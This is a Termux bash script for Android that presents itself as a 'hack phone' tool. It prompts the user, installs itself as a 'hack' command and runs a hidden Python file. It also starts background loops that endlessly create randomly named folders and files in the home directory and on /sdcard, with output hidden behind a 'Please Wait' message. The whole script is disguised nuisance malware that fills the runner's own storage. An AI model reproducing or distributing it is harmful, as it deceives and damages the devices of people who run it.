R() {
	cd $PREFIX/bin
	if [ -e python ];then
	cd ~/Phone
	python .r.py
	else
	pkg install python
	clear
	cd ~/Phone
	python .r.py
	fi
	}
	bann() {
	R
	figlet Phone
	echo
	}
	hack () {
		cd ~
		while [ true ];do
		cd ~
		mkdir dBUHhdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir dhdHHh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir dJFKhdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		cd /sdcard
		mkdir dBUHhdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir dhJGHHDJJDdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		touch $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		touch JXJD$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		printf "\033[92m Please Wait "
		done
		}
		w() {
			while [ true ];do
			print "wait"
		cd ~
		mkdir hdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir dHh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir dJFK$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
		cd /sdcard
		mkdir Udh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
		mkdir dDJJDdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
		touch $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
		touch JX$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&2
		hack
		done > /dev/null 2>&1 &
		}
	menu () {
		bann
		termux-setup-storage
		R
		w
		echo -e -n "Do you want to hack phone\033[0m (\033[96mY/N\033[0m)  "
		read a
		case $a in
		y|Y)hack ;;
		n|N)exit ;;
		*)menu ;;
		esac
		}
		set() {
			w
			apt update
			w
			apt upgrade
			w
			apt install python
			w
	apt install figlet
	cd $PREFIX/bin
	echo "#!/data/data/com.termux/files/usr/bin/sh" >> hack
	echo "bash $PREFIX/bin/phone.sh" >> hack
	chmod 777 hack
	mv ~/Phone/phone.sh $PREFIX/bin
	echo "Now you can use :- hack"
	read
	menu
	}
	cd $PREFIX/bin
	if [ -f hack ];then
	menu
	else
	set
	fi